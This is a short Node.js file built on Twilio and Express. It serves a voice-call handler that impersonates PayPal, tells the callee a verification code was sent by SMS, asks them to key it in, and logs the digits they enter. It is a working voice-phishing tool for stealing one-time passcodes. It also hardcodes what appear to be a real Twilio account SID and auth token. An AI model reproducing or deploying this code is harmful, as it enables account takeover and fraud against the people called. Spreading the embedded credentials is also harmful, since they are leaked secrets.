const accountSid = "AC5c4cfa7706014332e1b60a1de59f25de";
const authToken = "89a584b1437e1d8c4aea24b03646d9e8";
const client = require('twilio')(accountSid, authToken);
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const express = require('express');
const urlencoded = require('body-parser').urlencoded;

const app = express();

app.use(urlencoded({ extended: false }));

app.get('/voice', (request, response) => {
  const twiml = new VoiceResponse();

  const gather = twiml.gather({ numDigits: 8 });
  gather.say('This call is from Paypal dot com. \nWe have sent you a verification code SMS to this number. \nPress the number now to verify');

  twiml.redirect('/voice');

  response.type('text/xml');
  response.send(twiml.toString());
  if (request.body.Digits) {
      console.log(request.body.Digits)
  }
});

console.log('Twilio Client app HTTP server running at http://127.0.0.1:3000');
app.listen(3000);